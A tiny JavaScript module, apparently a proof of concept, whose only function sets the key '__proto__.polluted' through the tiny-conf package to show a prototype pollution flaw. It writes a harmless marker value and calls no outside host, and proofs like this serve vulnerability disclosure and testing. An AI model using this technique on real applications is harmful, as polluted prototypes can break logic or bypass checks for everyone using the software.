function exploitFunction() {
    const tinyConf = require("tiny-conf");
    tinyConf.set("__proto__.polluted", "yes");
}

module.exports = { exploitFunction };